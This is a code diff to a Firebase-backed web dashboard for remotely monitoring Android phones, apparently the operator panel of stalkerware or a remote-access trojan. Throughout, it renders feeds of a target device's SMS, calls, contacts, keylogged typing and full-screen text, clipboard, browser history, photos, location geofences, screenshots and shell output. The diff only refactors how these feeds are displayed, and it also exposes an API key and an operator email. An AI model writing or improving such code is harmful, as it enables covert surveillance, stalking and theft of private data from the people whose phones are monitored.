@@ -1,7 +1,7 @@
-import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js';
-import { getAuth, signOut, onAuthStateChanged } from 'https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js';
-import { getDatabase, ref, onValue, set, update, off, get, push, remove } from 'https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js';
-import { getStorage as getStorageInstance } from 'https://www.gstatic.com/firebasejs/10.8.0/firebase-storage.js';
+import { initializeApp } from 'https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js';
+import { getAuth, signOut, onAuthStateChanged } from 'https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js';
+import { getDatabase, ref, onValue, set, update, off, get, push, remove } from 'https://www.gstatic.com/firebasejs/11.1.0/firebase-database.js';
+import { getStorage as getStorageInstance } from 'https://www.gstatic.com/firebasejs/11.1.0/firebase-storage.js';
 
 const firebaseConfig = {
     apiKey: "AIzaSyBhaPM20tIhMalxLjoCklmwy4qb1ZkraSo",
@@ -21,7 +21,7 @@ const storage = getStorageInstance(app);
 let currentUser = null;
 let selectedDevice = null;
 let allDevices = [];
-let deviceListeners = new Map();
+let deviceListeners = {};
 const dataCache = new Map();
 const ALLOWED_OPERATOR_EMAIL = "nicholasbagenda@gmail.com";
 
@@ -45,13 +45,13 @@ onAuthStateChanged(auth, (user) => {
 
 function loadAllDevices() {
     const devicesRef = ref(database, 'devices');
-    const key = 'all-devices-listener';
     
-    if (deviceListeners.has(key)) {
-        off(deviceListeners.get(key));
+    // Cleanup existing listener if any
+    if (deviceListeners['all-devices']) {
+        off(deviceListeners['all-devices']);
     }
     
-    const unsubscribe = onValue(devicesRef, (snapshot) => {
+    deviceListeners['all-devices'] = onValue(devicesRef, (snapshot) => {
         allDevices = [];
         if (snapshot.exists()) {
             const data = snapshot.val();
@@ -77,25 +77,18 @@ function loadAllDevices() {
     }, (error) => {
         console.error("❌ Error loading devices:", error);
     });
-    
-    deviceListeners.set(key, unsubscribe);
 }
 
 function renderDevicesList() {
-    const fragment = document.createDocumentFragment();
     devicesList.innerHTML = '';
     deviceCount.textContent = allDevices.length;
-    
     allDevices.forEach(device => {
         const item = document.createElement('div');
         item.className = `device-item ${selectedDevice === device.uid ? 'active' : ''}`;
         item.innerHTML = `<div class="device-item-info"><div class="device-item-name">${device.name}</div><div class="device-item-status ${device.online ? 'device-online' : 'device-offline'}">${device.online ? '🟢 ONLINE' : '🔴 OFFLINE'} • 🔋${device.battery}%</div></div>`;
         item.addEventListener('click', () => selectDevice(device.uid));
-        fragment.appendChild(item);
+        devicesList.appendChild(item);
     });
-    
-    devicesList.appendChild(fragment);
-    
     if (allDevices.length === 0) showNoDeviceAlert();
     else { 
         noDeviceAlert.style.display = 'none'; 
@@ -110,26 +103,21 @@ function selectDevice(deviceUid) {
     deviceDashboard.style.display = 'block';
     injectAdvancedControls();
     
-    cleanupAllListeners();
+    // Cleanup all device-specific listeners
+    Object.keys(deviceListeners).forEach(key => { 
+        if (key !== 'all-devices') {
+            try { 
+                off(deviceListeners[key]); 
+            } catch(e) {
+                console.warn(`Failed to cleanup listener ${key}:`, e);
+            }
+        }
+    });
+    deviceListeners = { 'all-devices': deviceListeners['all-devices'] };
+    dataCache.clear();
     
     loadDeviceData(deviceUid);
     setupCommandListeners(deviceUid);
-}
-
-function cleanupAllListeners() {
-    deviceListeners.forEach((unsubscribe, key) => {
-        try {
-            if (typeof unsubscribe === 'function') {
-                unsubscribe();
-            } else {
-                off(unsubscribe);
-            }
-        } catch(e) {
-            console.warn(`Failed to cleanup listener ${key}:`, e);
-        }
-    });
-    deviceListeners.clear();
-    dataCache.clear();
 }
 
 function injectAdvancedControls() {
@@ -252,11 +240,9 @@ function initializeTelemetryStream(uid) {
     const statusRef = ref(database, `devices/${uid}/status`);
     const key = `status-${uid}`;
     
-    if (deviceListeners.has(key)) {
-        off(deviceListeners.get(key));
-    }
+    if (deviceListeners[key]) off(deviceListeners[key]);
     
-    const unsubscribe = onValue(statusRef, (snap) => {
+    deviceListeners[key] = onValue(statusRef, (snap) => {
         if (!snap.exists()) return;
         const d = snap.val();
         
@@ -341,19 +327,15 @@ function initializeTelemetryStream(uid) {
     }, (error) => {
         console.error("❌ Telemetry stream error:", error);
     });
-    
-    deviceListeners.set(key, unsubscribe);
 }
 
 function initializeCommandStateListeners(uid) {
     const commandsRef = ref(database, `devices/${uid}/commands`);
     const key = `commands-${uid}`;
     
-    if (deviceListeners.has(key)) {
-        off(deviceListeners.get(key));
-    }
+    if (deviceListeners[key]) off(deviceListeners[key]);
     
-    const unsubscribe = onValue(commandsRef, (snap) => {
+    deviceListeners[key] = onValue(commandsRef, (snap) => {
         const cmd = snap.val() || {};
         updateButtonState('cmd-flashlight', cmd.flashlight);
         updateButtonState('cmd-alarm', cmd.alarm);
@@ -371,8 +353,6 @@ function initializeCommandStateListeners(uid) {
     }, (error) => {
         console.error("❌ Command listener error:", error);
     });
-    
-    deviceListeners.set(key, unsubscribe);
 }
 
 function initializeDataFeedListeners(uid) {
@@ -394,33 +374,14 @@ function initializeDataFeedListeners(uid) {
             return;
         }
         
-        const fragment = document.createDocumentFragment();
-        msgs.forEach(m => {
-            const div = document.createElement('div');
-            div.className = 'feed-item';
-            div.innerHTML = `<strong>${esc(m.sender||'Unknown')}</strong> <small>${fmtTime(m.timestamp)}</small><br>${esc(m.body||'')}`;
-            fragment.appendChild(div);
-        });
-        f.innerHTML = '';
-        f.appendChild(fragment);
+        f.innerHTML = msgs.map(m=>`<div class="feed-item"><strong>${esc(m.sender||'Unknown')}</strong> <small>${fmtTime(m.timestamp)}</small><br>${esc(m.body||'')}</div>`).join('');
     });
     
     listenToFeed(uid, 'sms_live', (d) => {
         const items = Object.values(d||{}).sort((a,b)=>(b.timestamp||0)-(a.timestamp||0)).slice(0,20);
         const f = document.getElementById('sms-feed');
         if(!f||!items.length) return;
-        
-        const fragment = document.createDocumentFragment();
-        items.forEach(m => {
-            const div = document.createElement('div');
-            div.className = 'feed-item live-item';
-            div.innerHTML = `🔴 <strong>${esc(m.sender||'Unknown')}</strong> <small>${fmtTime(m.timestamp)}</small><br>${esc(m.body||'')}`;
-            fragment.appendChild(div);
-        });
-        
-        while (fragment.firstChild) {
-            f.insertBefore(fragment.firstChild, f.firstChild);
-        }
+        f.innerHTML = items.map(m=>`<div class="feed-item live-item">🔴 <strong>${esc(m.sender||'Unknown')}</strong> <small>${fmtTime(m.timestamp)}</small><br>${esc(m.body||'')}</div>`).join('') + f.innerHTML;
     });
     
     listenToFeed(uid, 'call_log', (d) => {
@@ -441,36 +402,21 @@ function initializeDataFeedListeners(uid) {
             return;
         }
         
-        const fragment = document.createDocumentFragment();
-        calls.forEach(call => {
-            const i = call.type==='incoming'?'📥':call.type==='outgoing'?'📤':'';
-            const dur = call.duration_seconds ? `${Math.floor(call.duration_seconds/60)}m ${call.duration_seconds%60}s` : '--';
-            const div = document.createElement('div');
-            div.className = 'feed-item';
-            div.innerHTML = `${i} <strong>${esc(call.name||call.number||'Unknown')}</strong> <small>${fmtTime(call.timestamp)} • ${dur} • ${call.type}</small>`;
-            fragment.appendChild(div);
-        });
-        f.innerHTML = '';
-        f.appendChild(fragment);
+        f.innerHTML = calls.map(c=>{
+            const i=c.type==='incoming'?'📥':c.type==='outgoing'?'📤':'';
+            const dur=c.duration_seconds?`${Math.floor(c.duration_seconds/60)}m ${c.duration_seconds%60}s`:'--';
+            return `<div class="feed-item">${i} <strong>${esc(c.name||c.number||'Unknown')}</strong> <small>${fmtTime(c.timestamp)} • ${dur} • ${c.type}</small></div>`;
+        }).join('');
     });
     
     listenToFeed(uid, 'calls_live', (d) => {
         const items = Object.values(d||{}).sort((a,b)=>(b.timestamp||0)-(a.timestamp||0)).slice(0,10);
         const f = document.getElementById('calls-feed');
         if(!f||!items.length) return;
-        
-        const fragment = document.createDocumentFragment();
-        items.forEach(c => {
-            const i = c.state==='ringing'?'🔔':c.state==='offhook'?'📞':'';
-            const div = document.createElement('div');
-            div.className = 'feed-item live-item';
-            div.innerHTML = `${i} <strong>${esc(c.name||c.number||'Unknown')}</strong> <small>${c.state} • ${fmtTime(c.timestamp)}</small>`;
-            fragment.appendChild(div);
-        });
-        
-        while (fragment.firstChild) {
-            f.insertBefore(fragment.firstChild, f.firstChild);
-        }
+        f.innerHTML = items.map(c=>{
+            const i=c.state==='ringing'?'🔔':c.state==='offhook'?'📞':'';
+            return `<div class="feed-item live-item">${i} <strong>${esc(c.name||c.number||'Unknown')}</strong> <small>${c.state} • ${fmtTime(c.timestamp)}</small></div>`;
+        }).join('') + f.innerHTML;
     });
 
     listenToFeed(uid, 'contacts', (d) => {
@@ -503,22 +449,14 @@ function initializeDataFeedListeners(uid) {
         
         var names = Object.keys(grouped).sort(function(a,b){return a.localeCompare(b);});
         var html = '<div class="feed-item" style="color:#00ff88;">👥 ' + names.length + ' unique contacts (' + ct.length + ' total entries)</div>';
-        
-        const fragment = document.createDocumentFragment();
         names.forEach(function(name) {
             var nums = grouped[name];
             var numHtml = nums.map(function(n){
                 return esc(n.number) + ' <span style="color:#555;">• ' + esc(n.type) + '</span>';
             }).join('<br>');
-            
-            const div = document.createElement('div');
-            div.className = 'feed-item';
-            div.innerHTML = `<strong>${esc(name)}</strong><br><small>${numHtml}</small>`;
-            fragment.appendChild(div);
+            html += '<div class="feed-item"><strong>' + esc(name) + '</strong><br><small>' + numHtml + '</small></div>';
         });
-        
         f.innerHTML = html;
-        f.appendChild(fragment);
     });
 
     listenToFeed(uid, 'wifi', (d) => {
@@ -535,19 +473,12 @@ function initializeDataFeedListeners(uid) {
         dataCache.set(cacheKey, nets);
         
         let h = `<div class="feed-item" style="color:#00ff88;">Connected: <strong>${esc(d.current_ssid||'Not connected')}</strong> (RSSI: ${d.current_rssi||'--'})</div>`;
-        
-        const fragment = document.createDocumentFragment();
-        nets.slice(0,30).forEach(n => {
-            const b = n.signal_strength>-50?'🟢':n.signal_strength>-70?'🟡':'🔴';
-            const l = n.is_secured?'🔒':'';
-            const div = document.createElement('div');
-            div.className = 'feed-item';
-            div.innerHTML = `${b} ${l} <strong>${esc(n.ssid||'Hidden')}</strong> <small>${n.signal_strength}dBm • ${n.frequency}MHz</small>`;
-            fragment.appendChild(div);
-        });
-        
+        h += nets.slice(0,30).map(n=>{
+            const b=n.signal_strength>-50?'🟢':n.signal_strength>-70?'🟡':'🔴';
+            const l=n.is_secured?'🔒':'';
+            return `<div class="feed-item">${b} ${l} <strong>${esc(n.ssid||'Hidden')}</strong> <small>${n.signal_strength}dBm • ${n.frequency}MHz</small></div>`;
+        }).join('');
         f.innerHTML = h;
-        f.appendChild(fragment);
     });
     
     listenToFeed(uid, 'installed_apps', (d) => {
@@ -571,17 +502,8 @@ function initializeDataFeedListeners(uid) {
         const ua = apps.filter(a=>!a.is_system);
         const sa = apps.filter(a=>a.is_system);
         let h = `<div class="feed-item" style="color:#00ff88;">📦 ${ua.length} user apps • ${sa.length} system apps</div>`;
-        
-        const fragment = document.createDocumentFragment();
-        ua.slice(0,50).forEach(a => {
-            const div = document.createElement('div');
-            div.className = 'feed-item';
-            div.innerHTML = `<strong>${esc(a.name||a.package_name)}</strong> <small>v${a.version_name||'?'} • ${a.package_name}</small>`;
-            fragment.appendChild(div);
-        });
-        
+        h += ua.slice(0,50).map(a=>`<div class="feed-item"><strong>${esc(a.name||a.package_name)}</strong> <small>v${a.version_name||'?'} • ${a.package_name}</small></div>`).join('');
         f.innerHTML = h;
-        f.appendChild(fragment);
     });
     
     listenToFeed(uid, 'device_info', (d) => {
@@ -607,17 +529,7 @@ function initializeDataFeedListeners(uid) {
             ['Screen',`${d.screen_width}x${d.screen_height}`],
             ['Uptime',`${Math.floor((d.uptime_seconds||0)/3600)}h ${Math.floor(((d.uptime_seconds||0)%3600)/60)}m`]
         ];
-        
-        const fragment = document.createDocumentFragment();
-        rows.forEach(([k,v]) => {
-            const div = document.createElement('div');
-            div.className = 'feed-item';
-            div.innerHTML = `<strong>${k}:</strong> ${v||'--'}`;
-            fragment.appendChild(div);
-        });
-        
-        f.innerHTML = '';
-        f.appendChild(fragment);
+        f.innerHTML = rows.map(([k,v])=>`<div class="feed-item"><strong>${k}:</strong> ${v||'--'}</div>`).join('');
     });
     
     listenToFeed(uid, 'battery_current', (d) => {
@@ -638,17 +550,7 @@ function initializeDataFeedListeners(uid) {
             ['Source',d.charge_source],
             ['Tech',d.technology]
         ];
-        
-        const fragment = document.createDocumentFragment();
-        rows.forEach(([k,v]) => {
-            const div = document.createElement('div');
-            div.className = 'feed-item';
-            div.innerHTML = `<strong>${k}:</strong> ${v||'--'}`;
-            fragment.appendChild(div);
-        });
-        
-        f.innerHTML = '';
-        f.appendChild(fragment);
+        f.innerHTML = rows.map(([k,v])=>`<div class="feed-item"><strong>${k}:</strong> ${v||'--'}</div>`).join('');
     });
 
     listenToFeed(uid, 'keylog', (d) => {
@@ -720,7 +622,6 @@ function initializeDataFeedListeners(uid) {
         var display = merged.slice(0, 80);
         var html = '<div class="feed-item" style="color:#00ff88;font-size:10px;">⌨️ ' + display.length + ' events — <span style="color:#4ecdc4;">⌨️ USER</span> typed · <span style="color:#ffd93d;">🖥️ DEVICE</span> screen · <span style="color:#ff6b6b;">📱 APP</span> switch · <span style="color:#a78bfa;">📝 CONTENT</span> full screen</div>';
 
-        const fragment = document.createDocumentFragment();
         display.forEach(function(k) {
             var icon, label, color, bgColor, borderColor;
 
@@ -740,30 +641,24 @@ function initializeDataFeedListeners(uid) {
 
             var appName = getFriendlyApp(k.app);
 
-            const div = document.createElement('div');
-            div.className = 'feed-item';
-            div.style.cssText = `border-left:3px solid ${borderColor};padding-left:8px;background:${bgColor};`;
-            
-            let content = '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:2px;">';
-            content += `<span style="color:${color};font-size:10px;font-weight:bold;">${icon} ${label}</span>`;
-            content += `<span style="color:#555;font-size:9px;">${esc(appName)} • ${fmtTime(k.timestamp)}</span>`;
-            content += '</div>';
+            html += '<div class="feed-item" style="border-left:3px solid ' + borderColor + ';padding-left:8px;background:' + bgColor + ';">';
+            html += '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:2px;">';
+            html += '<span style="color:' + color + ';font-size:10px;font-weight:bold;">' + icon + ' ' + label + '</span>';
+            html += '<span style="color:#555;font-size:9px;">' + esc(appName) + ' • ' + fmtTime(k.timestamp) + '</span>';
+            html += '</div>';
 
             if(k.event === 'app_switch') {
                 var prevName = k.previous_app ? getFriendlyApp(k.previous_app) : 'Home';
-                content += `<div style="color:#ff6b6b;font-size:11px;">${esc(prevName)} → <strong>${esc(appName)}</strong></div>`;
+                html += '<div style="color:#ff6b6b;font-size:11px;">' + esc(prevName) + ' → <strong>' + esc(appName) + '</strong></div>';
             } else if(k.event === 'screen_content') {
-                content += `<div style="color:#a78bfa;font-size:11px;white-space:pre-wrap;word-break:break-all;max-height:300px;overflow-y:auto;line-height:1.6;padding:6px;background:rgba(0,0,0,0.2);border-radius:4px;margin-top:4px;">${esc(k.text)}</div>`;
+                html += '<div style="color:#a78bfa;font-size:11px;white-space:pre-wrap;word-break:break-all;max-height:300px;overflow-y:auto;line-height:1.6;padding:6px;background:rgba(0,0,0,0.2);border-radius:4px;margin-top:4px;">' + esc(k.text) + '</div>';
             } else {
-                content += `<code style="color:#fff;font-size:11px;word-break:break-all;">${esc(k.text)}</code>`;
+                html += '<code style="color:#fff;font-size:11px;word-break:break-all;">' + esc(k.text) + '</code>';
             }
-            
-            div.innerHTML = content;
-            fragment.appendChild(div);
+            html += '</div>';
         });
 
         f.innerHTML = html;
-        f.appendChild(fragment);
     });
 
     listenToFeed(uid, 'screen_content', (d) => {
@@ -772,19 +667,14 @@ function initializeDataFeedListeners(uid) {
         if(!f) return;
         var appName = getFriendlyApp(d.app);
         var triggerLabel = d.trigger === 'app_switch' ? 'App opened' : d.trigger === 'after_input' ? 'After typing' : 'Screen changed';
-        
-        const div = document.createElement('div');
-        div.className = 'feed-item';
-        div.style.cssText = 'border-left:3px solid #a78bfa;padding-left:8px;background:rgba(167,139,250,0.1);margin-bottom:4px;';
-        
-        let html = '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px;">';
-        html += `<span style="color:#a78bfa;font-size:10px;font-weight:bold;">📝 FULL SCREEN — ${esc(triggerLabel)}</span>`;
-        html += `<span style="color:#555;font-size:9px;">${esc(appName)} • ${fmtTime(d.timestamp)}</span>`;
+        var html = '<div class="feed-item" style="border-left:3px solid #a78bfa;padding-left:8px;background:rgba(167,139,250,0.1);margin-bottom:4px;">';
+        html += '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px;">';
+        html += '<span style="color:#a78bfa;font-size:10px;font-weight:bold;">📝 FULL SCREEN — ' + esc(triggerLabel) + '</span>';
+        html += '<span style="color:#555;font-size:9px;">' + esc(appName) + ' • ' + fmtTime(d.timestamp) + '</span>';
         html += '</div>';
-        html += `<div style="color:#e0d4ff;font-size:11px;white-space:pre-wrap;word-break:break-all;max-height:400px;overflow-y:auto;line-height:1.6;background:rgba(0,0,0,0.3);padding:10px;border-radius:4px;">${esc(d.text)}</div>`;
-        
-        div.innerHTML = html;
-        f.insertBefore(div, f.firstChild);
+        html += '<div style="color:#e0d4ff;font-size:11px;white-space:pre-wrap;word-break:break-all;max-height:400px;overflow-y:auto;line-height:1.6;background:rgba(0,0,0,0.3);padding:10px;border-radius:4px;">' + esc(d.text) + '</div>';
+        html += '</div>';
+        f.innerHTML = html + f.innerHTML;
     });
 
     listenToFeed(uid, 'geofence_alerts', (d) => {
@@ -797,17 +687,10 @@ function initializeDataFeedListeners(uid) {
             return;
         }
         
-        const fragment = document.createDocumentFragment();
-        items.forEach(g => {
-            const i = g.event==='LEFT'?'🚨':'✅';
-            const div = document.createElement('div');
-            div.className = `feed-item ${g.event==='LEFT'?'alert-item':''}`;
-            div.innerHTML = `${i} <strong>${g.event}</strong> <small>${fmtTime(g.timestamp)} • ${Math.round(g.distance_meters||0)}m</small><br>📍 ${parseFloat(g.current_lat||0).toFixed(6)}, ${parseFloat(g.current_lng||0).toFixed(6)}`;
-            fragment.appendChild(div);
-        });
-        
-        f.innerHTML = '';
-        f.appendChild(fragment);
+        f.innerHTML = items.map(g=>{
+            const i=g.event==='LEFT'?'🚨':'✅';
+            return `<div class="feed-item ${g.event==='LEFT'?'alert-item':''}">${i} <strong>${g.event}</strong> <small>${fmtTime(g.timestamp)} • ${Math.round(g.distance_meters||0)}m</small><br>📍 ${parseFloat(g.current_lat||0).toFixed(6)}, ${parseFloat(g.current_lng||0).toFixed(6)}</div>`;
+        }).join('');
     });
     
     listenToFeed(uid, 'clipboard', (d) => {
@@ -820,27 +703,13 @@ function initializeDataFeedListeners(uid) {
             return;
         }
         
-        const fragment = document.createDocumentFragment();
-        items.forEach(c => {
-            const div = document.createElement('div');
-            div.className = 'feed-item';
-            div.innerHTML = `<small>${fmtTime(c.timestamp)} • ${c.length||0} chars</small><br><code>${esc((c.text||'').substring(0,200))}</code>`;
-            fragment.appendChild(div);
-        });
-        
-        f.innerHTML = '';
-        f.appendChild(fragment);
+        f.innerHTML = items.map(c=>`<div class="feed-item"><small>${fmtTime(c.timestamp)} • ${c.length||0} chars</small><br><code>${esc((c.text||'').substring(0,200))}</code></div>`).join('');
     });
     
     listenToFeed(uid, 'clipboard_current', (d) => {
         const f = document.getElementById('clipboard-feed');
         if(!f||!d||!d.text) return;
-        
-        const div = document.createElement('div');
-        div.className = 'feed-item live-item';
-        div.innerHTML = `📋 <strong>CURRENT</strong> <small>${fmtTime(d.timestamp)}</small><br><code>${esc(d.text.substring(0,300))}</code>`;
-        
-        f.insertBefore(div, f.firstChild);
+        f.innerHTML = `<div class="feed-item live-item">📋 <strong>CURRENT</strong> <small>${fmtTime(d.timestamp)}</small><br><code>${esc(d.text.substring(0,300))}</code></div>` + f.innerHTML;
     });
     
     listenToFeed(uid, 'browser_history', (d) => {
@@ -853,16 +722,7 @@ function initializeDataFeedListeners(uid) {
             return;
         }
         
-        const fragment = document.createDocumentFragment();
-        h.slice(0,50).forEach(h => {
-            const div = document.createElement('div');
-            div.className = 'feed-item';
-            div.innerHTML = `<strong>${esc(h.title||'Untitled')}</strong><br><a href="${h.url}" target="_blank" style="color:#4ecdc4;font-size:11px;">${esc((h.url||'').substring(0,80))}</a> <small>${fmtTime(h.date)}</small>`;
-            fragment.appendChild(div);
-        });
-        
-        f.innerHTML = '';
-        f.appendChild(fragment);
+        f.innerHTML = h.slice(0,50).map(h=>`<div class="feed-item"><strong>${esc(h.title||'Untitled')}</strong><br><a href="${h.url}" target="_blank" style="color:#4ecdc4;font-size:11px;">${esc((h.url||'').substring(0,80))}</a> <small>${fmtTime(h.date)}</small></div>`).join('');
     });
 
     listenToFeed(uid, 'gallery_list', (d) => {
@@ -872,24 +732,14 @@ function initializeDataFeedListeners(uid) {
         
         if(d.status==='loading') {
             let html = `<div class="feed-item" style="color:#ffaa00;">⏳ Loading thumbnails... ${d.total_read||0} photos processed</div>`;
-            
-            const fragment = document.createDocumentFragment();
-            p.slice(0,10).forEach(photo => {
-                const thumb = photo.thumbnail_url || '';
-                const div = document.createElement('div');
-                div.className = 'feed-item';
-                
-                if (thumb) {
-                    div.innerHTML = `<img src="${thumb}" style="width:100%;max-width:320px;border-radius:6px;margin-bottom:4px;" loading="lazy"><small>${esc(photo.name||'')} • ${(photo.size_kb||0)}KB</small>`;
-                } else {
-                    div.innerHTML = `<div style="width:100%;height:50px;background:#1a1a2e;border-radius:6px;margin-bottom:4px;display:flex;align-items:center;justify-content:center;color:#555;font-size:10px;">Generating...</div><small>${esc(photo.name||'')} • ${(photo.size_kb||0)}KB</small>`;
-                }
-                
-                fragment.appendChild(div);
-            });
-            
+            html += p.slice(0,10).map(p => {
+                const thumb = p.thumbnail_url || '';
+                const imgHtml = thumb
+                    ? `<img src="${thumb}" style="width:100%;max-width:320px;border-radius:6px;margin-bottom:4px;" loading="lazy">`
+                    : `<div style="width:100%;height:50px;background:#1a1a2e;border-radius:6px;margin-bottom:4px;display:flex;align-items:center;justify-content:center;color:#555;font-size:10px;">Generating...</div>`;
+                return `<div class="feed-item">${imgHtml}<small>${esc(p.name||'')} • ${(p.size_kb||0)}KB</small></div>`;
+            }).join('');
             f.innerHTML = html;
-            f.appendChild(fragment);
             return;
         }
         
@@ -898,23 +748,14 @@ function initializeDataFeedListeners(uid) {
             return;
         }
         
-        const fragment = document.createDocumentFragment();
-        p.slice(0,30).forEach(photo => {
-            const thumb = photo.thumbnail_url || '';
-            const div = document.createElement('div');
-            div.className = 'feed-item';
-            
-            if (thumb) {
-                div.innerHTML = `<img src="${thumb}" style="width:100%;max-width:320px;border-radius:6px;margin-bottom:4px;cursor:pointer;display:block;" onclick="openPreview(this.src)" loading="lazy" onerror="this.style.display='none';this.nextElementSibling.style.display='flex';"><div style="width:100%;height:50px;background:#1a1a2e;border-radius:6px;margin-bottom:4px;display:none;align-items:center;justify-content:center;color:#555;font-size:10px;">Failed to load</div><strong>${esc(photo.name||'Unknown')}</strong> <small>${fmtTime(photo.date_taken)} • ${(photo.size_kb||0)}KB</small>`;
-            } else {
-                div.innerHTML = `<div style="width:100%;height:50px;background:#1a1a2e;border-radius:6px;margin-bottom:4px;display:flex;align-items:center;justify-content:center;color:#555;font-size:10px;">No thumbnail</div><strong>${esc(photo.name||'Unknown')}</strong> <small>${fmtTime(photo.date_taken)} • ${(photo.size_kb||0)}KB</small>`;
-            }
-            
-            fragment.appendChild(div);
-        });
-        
-        f.innerHTML = '';
-        f.appendChild(fragment);
+        f.innerHTML = p.slice(0,30).map(p => {
+            const thumb = p.thumbnail_url || '';
+            const imgHtml = thumb
+                ? `<img src="${thumb}" style="width:100%;max-width:320px;border-radius:6px;margin-bottom:4px;cursor:pointer;display:block;" onclick="openPreview(this.src)" loading="lazy" onerror="this.style.display='none';this.nextElementSibling.style.display='flex';">
+                   <div style="width:100%;height:50px;background:#1a1a2e;border-radius:6px;margin-bottom:4px;display:none;align-items:center;justify-content:center;color:#555;font-size:10px;">Failed to load</div>`
+                : `<div style="width:100%;height:50px;background:#1a1a2e;border-radius:6px;margin-bottom:4px;display:flex;align-items:center;justify-content:center;color:#555;font-size:10px;">No thumbnail</div>`;
+            return `<div class="feed-item">${imgHtml}<strong>${esc(p.name||'Unknown')}</strong> <small>${fmtTime(p.date_taken)} • ${(p.size_kb||0)}KB</small></div>`;
+        }).join('');
     });
 
     listenToFeed(uid, 'shell_output', (d) => {
@@ -1050,13 +891,7 @@ function initializeDataFeedListeners(uid) {
     listenToFeed(uid, 'geofence_status', (d) => {
         const f = document.getElementById('geofence-feed');
         if(!f||!d||!d.active) return;
-        
-        const div = document.createElement('div');
-        div.className = 'feed-item';
-        div.style.color = '#ffd93d';
-        div.textContent = `📍 Geofence ACTIVE at ${d.lat}, ${d.lng} (radius: ${d.radius}m)`;
-        
-        f.insertBefore(div, f.firstChild);
+        f.innerHTML = `<div class="feed-item" style="color:#ffd93d;">📍 Geofence ACTIVE at ${d.lat}, ${d.lng} (radius: ${d.radius}m)</div>` + f.innerHTML;
     });
     
     listenToFeed(uid, 'screenshot', (d) => {
@@ -1203,17 +1038,13 @@ function initializeDataFeedListeners(uid) {
         var icon = d.status === 'success' ? '✅' : d.status === 'ui_opened' ? '📱' : '❌';
         var color = d.status === 'success' ? '#00ff88' : d.status === 'ui_opened' ? '#ffd93d' : '#ff6b6b';
         var actionName = (d.action || 'unknown').replace(/_/g, ' ').toUpperCase();
+        var html = '<div class="feed-item" style="border-left:3px solid ' + color + ';padding-left:10px;">';
+        html += '<div style="color:' + color + ';font-weight:bold;font-size:12px;">' + icon + ' ' + actionName + ' — ' + (d.status || '').toUpperCase() + '</div>';
+        html += '<div style="color:#888;font-size:11px;margin-top:4px;">' + esc(d.message || '') + '</div>';
+        html += '<div style="color:#555;font-size:10px;margin-top:2px;">' + fmtTime(d.timestamp) + '</div>';
+        html += '</div>';
         
-        const div = document.createElement('div');
-        div.className = 'feed-item';
-        div.style.cssText = `border-left:3px solid ${color};padding-left:10px;`;
-        
-        let html = `<div style="color:${color};font-weight:bold;font-size:12px;">${icon} ${actionName} — ${(d.status || '').toUpperCase()}</div>`;
-        html += `<div style="color:#888;font-size:11px;margin-top:4px;">${esc(d.message || '')}</div>`;
-        html += `<div style="color:#555;font-size:10px;margin-top:2px;">${fmtTime(d.timestamp)}</div>`;
-        
-        div.innerHTML = html;
-        f.insertBefore(div, f.firstChild);
+        if (f.innerHTML !== html) f.innerHTML = html;
         
         console.log(icon + ' ' + (d.action||'?') + ': ' + (d.message||''));
     });
@@ -1223,11 +1054,9 @@ function listenToFeed(uid, path, cb) {
     const r = ref(database, `devices/${uid}/${path}`);
     const k = `feed-${path}-${uid}`;
     
-    if (deviceListeners.has(k)) {
-        off(deviceListeners.get(k));
-    }
+    if(deviceListeners[k]) off(deviceListeners[k]);
     
-    const unsubscribe = onValue(r, (s) => {
+    deviceListeners[k] = onValue(r, (s) => {
         if(s.exists()) {
             try {
                 cb(s.val());
@@ -1238,8 +1067,6 @@ function listenToFeed(uid, path, cb) {
     }, (error) => {
         console.error(`❌ Feed listener error [${path}]:`, error);
     });
-    
-    deviceListeners.set(k, unsubscribe);
 }
 
 function getFriendlyApp(pkg) {
